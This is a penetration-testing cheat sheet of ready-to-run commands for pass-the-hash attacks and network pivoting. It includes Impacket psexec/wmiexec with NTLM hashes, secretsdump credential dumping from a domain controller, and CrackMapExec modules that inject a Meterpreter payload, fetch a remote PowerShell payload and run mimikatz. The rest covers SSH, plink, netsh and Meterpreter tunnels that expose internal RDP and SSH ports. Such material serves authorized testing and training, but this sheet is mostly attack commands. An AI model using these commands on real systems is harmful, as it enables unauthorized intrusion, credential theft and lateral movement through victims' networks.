### Passing The Hash

Syntax examples taken mostly from this awesome blog

https://blog.ropnop.com/practical-usage-of-ntlm-hashes/

Several ways and tools you can run psexec or use hashes...

##### pth-toolkit
https://github.com/byt3bl33d3r/pth-toolkit
```
pth-winexe -U cscou/kbryant%asdfasd21341241234asdasd:23423sdfasdf1234  //ordws01.cscou.lab cmd.exe
pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
```
##### Impacket 
https://github.com/CoreSecurity/impacket
```
psexec.py Administrator:crapass@10.10.10.10
psexec.py BUFU/spice1:vallejo@10.10.10.10 
psexec.py Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
smbexec.py BUFU/spice1:eastbayg@10.10.10.10 (doesnt drop a binary)
wmiexec.py BUFU/blegit:valleyho@10.10.10.10
secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

##### CrackMapExec
https://github.com/byt3bl33d3r/CrackMapExec
```
crackmapexec.py 10.10.10.0/24 -d BUFU -u silverback -p g0rilla -x whoami
crackmapexec.py 10.10.10.0/24 -u tnutty -H 24cf234234908098092834234234
crackmapexec 10.10.10.10 -u Administrator -p ak47inth3fr33zer --shares
crackmapexec smb -L
crackmapexec smb -M name_module -o VAR=DATA
crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
crackmapexec mimikatz --server http --server-port 80
```
##### Nmap
```
nmap -sU -sS --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p U:137,T:139 <host>
```
##### Rdesktop
```
apt-get install freerdp-x11
xfreerdp /u:crap /d:win2012 /pth:HASH /v:IP
```

### Port Forwarding 

##### SOCKS Proxy
```
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```
##### Proxychains
Config file: /etc/proxychains.conf
```
[ProxyList]
socks4 localhost 8080
```
Set the SOCKS4 proxy then proxychains whatever tool

##### Windows netsh Port Forwarding

```
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
```

##### plink

```powershell
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw mypassword 192.168.18.84 -R
plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
```

##### Meterpreter portfwd
 https://www.offensive-security.com/metasploit-unleashed/portfwd/
 forward remote port to local address
```
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389

or

portfwd list
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445

or

run autoroute -s 192.168.57.0/24
use auxiliary/server/socks4a
```
##### SSH pivots from one network to another
```
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
```
##### Remote Port Forwarding
```
ssh -R 9000:localhost:8001 username@hostname
ssh -R 2222:localhost:22 username@hostname - SSH
ssh -R 2223:localhost:5902 username@hostname - VNC
autossh -M 20000 -f -R 2222:localhost:80 username@hostname
```
##### SShuttle
https://sshuttle.readthedocs.io/en/stable/usage.html

To sshuttle into an internal network and forward all traffic
```
sshuttle -r user@10.10.10.10 10.1.1.0/24 -vNH
```

##### References
https://chryzsh.gitbooks.io/pentestbook/content/port_forwarding_and_tunneling.html

https://blog.ropnop.com/

https://www.toshellandback.com/2017/02/11/psexec/

https://blog.ropnop.com/practical-usage-of-ntlm-hashes/
